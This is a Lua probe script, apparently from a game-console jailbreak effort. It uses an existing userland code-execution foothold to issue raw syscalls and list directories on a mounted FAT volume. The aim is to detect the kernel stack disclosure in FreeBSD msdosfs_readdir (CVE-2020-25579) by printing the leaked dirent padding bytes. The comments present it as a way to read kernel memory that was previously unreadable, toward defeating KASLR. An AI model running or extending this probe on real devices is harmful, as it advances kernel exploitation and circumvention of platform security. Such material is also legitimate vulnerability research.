-- CRASH_CLASS: LOW
-- PROBE 289a: does a FAT volume leak its dirent padding on 14.10
--
-- Context: FreeBSD msdosfs had CVE-2020-25579, a kernel stack disclosure in
-- msdosfs_readdir. A `struct dirent dirbuf` on the kernel stack was only partly
-- initialised, and the second uiomove() in the readdir loop copied three
-- padding bytes (d_pad0 at +19, d_pad1 at +22) out to userland without zeroing
-- them. The root-directory branch got a dirent_terminate(); the loop that walks
-- a normal directory did not, so any subdirectory of a mounted FAT volume leaks.
--
-- Three bytes per call is not a KASLR oracle on its own, but it is kernel stack
-- memory - the only kernel memory we have never been able to read on 14.10.
--
-- This probe only measures. It looks for a mounted FAT volume under /mnt and
-- lists one directory on it, printing the padding bytes of every entry.
--
-- The console needs the USB stick mounted, which means Media Gallery or a save
-- data import has to have touched it at least once.

print("=== PROBE 289a: msdosfs dirent padding ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" and v.h then h, l = v.h, v.l end
    if h % 0x100000000 == 0xFFFFFFFF and l % 0x100000000 == 0xFFFFFFFF then return -1 end
    if h == 0 and l >= 0x80000000 then return l - 0x100000000 end
    return l
end
local function put_str(s)
    local buf = memory.alloc(#s + 1)
    for i = 1, #s do pcall(function() memory.write_byte(buf + i - 1, s:byte(i)) end) end
    pcall(function() memory.write_byte(buf + #s, 0) end)
    return buf
end
local function rd_buf(addr, n)
    local out, hi = {}, 0
    while (#out * 2) < n and hi < 0x3000 do
        local w = 0
        local ok, v = pcall(function() return memory.read_dword(addr + hi) end)
        if not ok then break end
        w = to_num(v)
        for k = 0, 3 do
            local b = math.floor(w / (2 ^ (8 * k))) % 256
            out[#out + 1] = string.format("%02X", b)
            if #out * 2 >= n then break end
        end
        hi = hi + 4
    end
    return table.concat(out, " ")
end

local sc_open = make_syscall(5)
local sc_close = make_syscall(6)

local O_RDONLY = 0
local O_DIRECTORY = 0x20000

local dirent_syscalls = { 196, 554, 272, 344 }
local buf = memory.alloc(0x4000)
local basep = memory.alloc(8)

-- Open a path, returning fd and the syscall number that listed it successfully.
local function list_dir(path)
    local fd = sgn(sc_open(uint64(put_str(path)), uint64(O_RDONLY + O_DIRECTORY), uint64(0)))
    if fd < 0 then
        fd = sgn(sc_open(uint64(put_str(path)), uint64(O_RDONLY), uint64(0)))
    end
    if fd < 0 then return nil, nil, path end
    local used, n = nil, 0
    for _, num in ipairs(dirent_syscalls) do
        local sc = make_syscall(num)
        for off = 0, 0x3FFC, 4 do pcall(function() memory.write_dword(buf + off, 0) end) end
        local r = sgn(sc(uint64(fd), uint64(buf), uint64(0x4000), uint64(basep)))
        if r > 0 then
            used, n = num, r
            break
        end
    end
    return fd, used, n
end

local names = {}
local function walk(n, verbose)
    local off = 0
    local count = 0
    while off < n do
        local reclen = 0
        local ok, v = pcall(function() return memory.read_word(buf + off + 16) end)
        if not ok then break end
        reclen = to_num(v)
        if reclen < 24 or reclen > 0x1000 then break end
        if off + 24 > n then break end
        local pad0 = 0
        local pad1 = 0
        local namlen = 0
        pcall(function() pad0 = to_num(memory.read_byte(buf + off + 19)) end)
        pcall(function() pad1 = to_num(memory.read_word(buf + off + 22)) end)
        pcall(function() namlen = to_num(memory.read_word(buf + off + 20)) end)
        local nm = ""
        if namlen > 0 and namlen < 256 then
            for i = 0, namlen - 1 do
                local c = 0
                pcall(function() c = to_num(memory.read_byte(buf + off + 24 + i)) end)
                if c > 0 and c < 128 then nm = nm .. string.char(c) end
            end
        end
        count = count + 1
        if verbose and count <= 12 then
            print(string.format("    [%d] name=%-28s len=%d pad0=0x%02X pad1=0x%04X", count, nm, namlen, pad0, pad1))
        end
        if nm ~= "" and nm ~= "." and nm ~= ".." then names[#names + 1] = path_base .. "/" .. nm end
        if pad0 ~= 0 or pad1 ~= 0 then
            print(string.format("    LEAK name=%s pad0=0x%02X pad1=0x%04X", nm, pad0, pad1))
        end
        off = off + reclen
    end
    return count
end

path_base = ""

local roots = { "/mnt", "/mnt/usb0", "/mnt/usb1", "/mnt/usb2" }

for _, root in ipairs(roots) do
    local fd, used, n = list_dir(root)
    print(string.format("[%s] fd=%s syscall=%s n=%s", root, tostring(fd), tostring(used), tostring(n)))
    if fd and used then
        print("  first bytes: " .. rd_buf(buf, 96))
        path_base = root
        local c = walk(n, true)
        print(string.format("  entries=%d", c))
        pcall(function() sc_close(uint64(fd)) end)
    end
end

print("")
print("[names] " .. table.concat(names, " "))

for _, p in ipairs(names) do
    local fd, used, n = list_dir(p)
    if fd and used then
        print(string.format("[%s] syscall=%s n=%s", p, tostring(used), tostring(n)))
        local keep = path_base
        path_base = p
        walk(n, true)
        path_base = keep
        pcall(function() sc_close(uint64(fd)) end)
    end
end

print("")
print("=== PROBE 289a COMPLETE ===")
